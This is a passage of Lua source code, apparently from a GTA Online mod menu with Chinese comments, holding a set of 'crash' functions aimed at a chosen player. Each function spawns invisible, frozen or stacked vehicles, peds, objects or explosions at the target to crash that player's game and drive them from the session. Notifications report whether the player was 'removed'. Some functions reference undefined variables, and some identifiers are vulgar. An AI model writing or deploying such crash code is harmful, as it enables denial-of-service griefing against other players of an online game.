    TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 777)
    TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 17, 888)
    TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
    end
    end
--大鸡巴崩溃
function suckmydick(pid)
local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
local Object_jb1 = CreateObject(0xD75E01A6, TargetPlayerPos)
local Object_jb2 = CreateObject(0x675D244E, TargetPlayerPos)
local Object_jb3 = CreateObject(0x799B48CA, TargetPlayerPos)
local Object_jb4 = CreateObject(0x68E49D4D, TargetPlayerPos)
local Object_jb5 = CreateObject(0x66F34017, TargetPlayerPos)
local Object_jb6 = CreateObject(0xDE1807BB, TargetPlayerPos)
local Object_jb7 = CreateObject(0xC4C9551E, TargetPlayerPos)
local Object_jb8 = CreateObject(0xCF37BA1F, TargetPlayerPos)
local Object_jb9 = CreateObject(0xB69AD9F8, TargetPlayerPos)
local Object_jb10 = CreateObject(0x5D750529, TargetPlayerPos)
local Object_jb11 = CreateObject(0x1705D85C, TargetPlayerPos)
for i = 0, 1000 do 
local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb3, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb4, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb5, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb6, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb7, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb8, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb9, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb10, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_jb11 ,TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
wait(10)
end
wait(5500)
entities.delete_by_handle(Object_jb1)
entities.delete_by_handle(Object_jb2)
entities.delete_by_handle(Object_jb3)
entities.delete_by_handle(Object_jb4)
entities.delete_by_handle(Object_jb5)
entities.delete_by_handle(Object_jb6)
entities.delete_by_handle(Object_jb7)
entities.delete_by_handle(Object_jb8)
entities.delete_by_handle(Object_jb9)
entities.delete_by_handle(Object_jb10)
entities.delete_by_handle(Object_jb11)
end
--导弹车崩溃V1
function daodanchev1(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    SpawnedVehicleList = { };
    for i = 1, 80 do
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
    SpawnedVehicleList[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
    ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
    wait(50)
    end
    wait(4000)
    for i = 1, 80 do
    entities.delete_by_handle(SpawnedVehicleList[i])
    end
    end
--导弹车崩溃V2
function daodanchev2(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    TargetPlayerPos.y = TargetPlayerPos.y + 1050
    SpawnedVehicleList1 = { };
    for i = 1, 60 do
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
    SpawnedVehicleList1[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList1[i], true)
    ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList1[i], false, 0)
    wait(50)
    end
    wait(2000)
    for i = 1, 60 do
    entities.delete_by_handle(SpawnedVehicleList1[i])
    end
    wait(1000)
    SpawnedVehicleList2 = { };
    for i = 1, 50 do
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
    SpawnedVehicleList2[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList2[i], true)
    ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList2[i], false, 0)
    wait(50)
    end
    wait(2000)
    for i = 1, 50 do
    entities.delete_by_handle(SpawnedVehicleList2[i])
    end
end
--无效外观V1
function BadOutfitCrashV1(pid)
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
    local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    for i = 0, 500 do
        PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
        ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false, true);
        wait(10)
    end
       entities.delete_by_handle(Spawned_Mike)
       menu.trigger_commands("anticrashcam off")
    end
---单崩黄昏
function dhcrash(pid)
    for pedp_crash = 2 , 6 do
    pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    dune = CreateVehicle(410882957,pos,ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dune, true)
    dune1 = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dune1, true)
    barracks = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks, true)
    barracks1 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks1, true)
    dunecar = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar, true)
    dunecar1 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar1, true)
    dunecar2 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar2, true)
    barracks3 = CreateVehicle(4244420235,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks3, true)
    barracks31 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks31, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks31, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar2, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar, pedp, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    wait(5000)
    for i = 0, 100  do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dunecar, pos.x, pos.y, pos.z, false, true, true)
            wait(10)
        end
        wait(2000)
        entities.delete_by_handle(dune)
        entities.delete_by_handle(dune1)
        entities.delete_by_handle(barracks)
        entities.delete_by_handle(barracks1)
        entities.delete_by_handle(dunecar)
        entities.delete_by_handle(dunecar1)
        entities.delete_by_handle(dunecar2)
        entities.delete_by_handle(barracks3)
        entities.delete_by_handle(barracks31)
    end
end
function OXcrashgg(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local PED1 = CreatePed(26,util.joaat("cs_beverly"),TargetPlayerPos, 0)
    ENTITY.SET_ENTITY_VISIBLE(PED1, false, 0)
    wait(100)
    WEAPON.GIVE_WEAPON_TO_PED(PED1,-270015777,80,true,true)
    wait(1000)
    FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    wait(10000)
    entities.delete_by_handle(PED1)
    if players.exists(pid) then
        notification("未能移除玩家,正在使用cs_fabien模型",colors.red)
        local PED2 = CreatePed(26,util.joaat("cs_fabien"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED2, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED2,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        wait(5000)
        entities.delete_by_handle(PED2)
        end
    if players.exists(pid) then
        notification("未能移除玩家,正在使用cs_manuel模型",colors.red)
        local PED3 = CreatePed(26,util.joaat("cs_manuel"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED3, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED3,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        wait(5000)
        entities.delete_by_handle(PED3)
        end
    if players.exists(pid) then
        notification("未能移除玩家,正在使用cs_taostranslator模型",colors.red)
        local PED4 = CreatePed(26,util.joaat("cs_taostranslator"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED4, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED4,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        wait(5000)
        entities.delete_by_handle(PED4)
        end
    if players.exists(pid) then
        notification("未能移除玩家,正在使用cs_taostranslator2模型",colors.red)
        local PED5 = CreatePed(26,util.joaat("cs_taostranslator2"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED5, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED5,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        wait(5000)
        entities.delete_by_handle(PED5)
        end
    if players.exists(pid) then
        notification("未能移除玩家,正在使用cs_tenniscoach模型",colors.red)
        local PED6 = CreatePed(26,util.joaat("cs_tenniscoach"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED6, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED6,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        wait(5000)
            entities.delete_by_handle(PED6)
        end
    if players.exists(pid) then
        notification("未能移除玩家,正在使用cs_wade模型",colors.red)
        local PED7 = CreatePed(26,util.joaat("cs_wade"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED7, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED7,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        wait(5000)
        entities.delete_by_handle(PED7)
        end
    if not players.exists(pid) then
        notification("成功移除玩家",colors.red)
    end
end
function OXcrashggv2(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local PED1 = CreatePed(26,util.joaat("cs_beverly"),TargetPlayerPos, 0)
    ENTITY.SET_ENTITY_VISIBLE(PED1, false, 0)
    wait(100)
    WEAPON.GIVE_WEAPON_TO_PED(PED1,-270015777,80,true,true)
    wait(1000)
    FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
    wait(1000)
    entities.delete_by_handle(PED1)
    if players.exists(pid) then
        local PED2 = CreatePed(26,util.joaat("cs_fabien"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED2, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED2,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        wait(1000)
        entities.delete_by_handle(PED2)
        end
    if players.exists(pid) then
        local PED3 = CreatePed(26,util.joaat("cs_manuel"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED3, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED3,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        wait(1000)
        entities.delete_by_handle(PED3)
        end
    if players.exists(pid) then
        local PED4 = CreatePed(26,util.joaat("cs_taostranslator"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED4, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED4,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        wait(1000)
        entities.delete_by_handle(PED4)
        end
    if players.exists(pid) then
        local PED5 = CreatePed(26,util.joaat("cs_taostranslator2"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED5, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED5,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        wait(1000)
        entities.delete_by_handle(PED5)
        end
    if players.exists(pid) then
        local PED6 = CreatePed(26,util.joaat("cs_tenniscoach"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED6, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED6,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        wait(1000)
            entities.delete_by_handle(PED6)
        end
    if players.exists(pid) then
        local PED7 = CreatePed(26,util.joaat("cs_wade"),TargetPlayerPos, 0)
        ENTITY.SET_ENTITY_VISIBLE(PED7, false, 0)
        wait(100)
        WEAPON.GIVE_WEAPON_TO_PED(PED7,-270015777,80,true,true)
        wait(1000)
        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
        wait(1000)
        entities.delete_by_handle(PED7)
        end
    if not players.exists(pid) then
        notification("成功移除玩家",colors.blue)
    end
end
---拖车崩
function tuocheb(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    SpawnedDune1 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune1, true)
    SpawnedDune2 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune2, true)
    SpawnedBarracks1 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks1, true)
    SpawnedBarracks2 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks2, true)
    SpawnedTowtruck = CreateVehicle(util.joaat("towtruck2"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedTowtruck, true)
    SpawnedBarracks31 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks31, true)
    SpawnedBarracks32 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks32, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks31, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks32, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    for i = 0, 100 do 
        TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SpawnedTowtruck, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        wait(10)
    end
    wait(2000)
    entities.delete_by_handle(SpawnedTowtruck)
    entities.delete_by_handle(SpawnedDune1)
    entities.delete_by_handle(SpawnedDune2)
    entities.delete_by_handle(SpawnedBarracks31)
    entities.delete_by_handle(SpawnedBarracks32)
    entities.delete_by_handle(SpawnedBarracks1)
    entities.delete_by_handle(SpawnedBarracks2)
end 
---鬼崩
function guibeng(pid)
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
    local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
    local Spawned_tr3 = CreateVehicle(util.joaat("tr3"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_tr3, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(Spawned_tr3, false, 0)
    local Spawned_chernobog = CreateVehicle(util.joaat("chernobog"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_chernobog, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(Spawned_chernobog, false, 0)
    local Spawned_avenger = CreateVehicle(util.joaat("avenger"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(Spawned_avenger, SelfPlayerPed, 0, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(Spawned_avenger, false, 0)
    for i = 0, 100 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false)
        wait(10 * math.random())
        ENTITY.SET_ENTITY_COORDS(SelfPlayerPed, SelfPlayerPos.x, SelfPlayerPos.y, SelfPlayerPos.z, true, false, false)
        wait(10 * math.random())
    end
    menu.trigger_commands("anticrashcam off")
end
---猎杀者
function huntercrash(pid)
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local SpawnedVehicleList = { };
    for i = 1, 60 do
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        SpawnedVehicleList[i] = CreateVehicle(util.joaat("hunter"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
        ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList[i], true)
        ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList[i], false, 0)
        wait(50)
    end
    wait(5000)
    for i = 1, 60 do
        entities.delete_by_handle(SpawnedVehicleList[i])
    end
    menu.trigger_commands("anticrashcam off")
end
--碎片崩溃V1
function v1_frag(pid)
    BlockSyncs(pid, function()
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
        wait(1000)
        entities.delete_by_handle(object)
    end)
end
--碎片崩溃V2
function v2_frag(pid)
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    local Object_pizza2 = entities.create_object(util.joaat("prop_fragtest_cnst_04"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, false)
    for i = 0, 100 do 
        local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza2, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
    wait(10)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza2)
    entities.delete_by_handle(Object_pizza2)
    return
end
end
--[[大春痘崩溃
function big_chungus()
local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local pos = ENTITY.GET_ENTITY_COORDS(ped, true)
